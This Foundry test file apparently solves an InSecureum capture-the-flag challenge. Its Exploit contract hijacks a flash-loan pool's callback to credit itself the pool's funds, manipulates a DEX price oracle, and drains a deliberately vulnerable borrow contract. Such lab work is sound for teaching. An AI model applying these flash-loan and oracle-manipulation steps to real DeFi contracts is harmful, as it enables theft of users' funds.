// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//
        Exploit attacker = new Exploit(address(token0), address(token1), address(oracleDex), address(target), address(flashLoanPool));
        attacker.pwn();
        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    /// @dev Token contract address to be used for lending.
    //IERC20 immutable public token;
    IERC20 public token;
    /// @dev Internal balances of the pool for each user.
    mapping(address => uint) public balances;

    // flag to notice contract is on a flashloan
    bool private _flashLoan;

    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;
    InSecureumLenderPool flashLoan;

    constructor(address _token0, address _token1, address _dex, address _borrowSystem, address _flashLoanPool){
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        dex = InsecureDexLP(_dex);
        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
        flashLoan = InSecureumLenderPool(_flashLoanPool);
        token0.approve(address(dex),type(uint256).max);
        token1.approve(address(dex),type(uint256).max);
        token0.approve(address(borrowSystem),type(uint256).max);
        token1.approve(address(borrowSystem),type(uint256).max);
        token0.approve(address(flashLoan),type(uint256).max);
        token1.approve(address(flashLoan),type(uint256).max);
    }

    function pwn() external {
        //get token0 of FlashLoanPool
        uint256 amount = token0.balanceOf(address(flashLoan));
        flashLoan.flashLoan(
          address(this),
          abi.encodeWithSignature(
            "receiveFlashLoan(uint256,address)", amount,address(this)
          )
        );
        flashLoan.withdraw(amount);

        //manipulate price of token 1
        dex.swap(address(token0),address(token1),99 ether);
        console.log("token 1 price before : ", borrowSystem.tokenPrice(token1.balanceOf(address(this))));
        token0.transfer(address(dex), token0.balanceOf(address(this)));
        dex.swap(address(token1),address(token0),1 ether);
        console.log("token 1 price after : ", borrowSystem.tokenPrice(token1.balanceOf(address(this))));

        //get all token0 from borrowSystem
        borrowSystem.depositToken1(token1.balanceOf(address(this))); 
        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
        token0.transfer(address(flashLoan),1000 ether);

        //The solution is not optimized
    }
    function receiveFlashLoan(uint256 amount, address attacker) public {
        balances[attacker] = amount;
        
    }
}
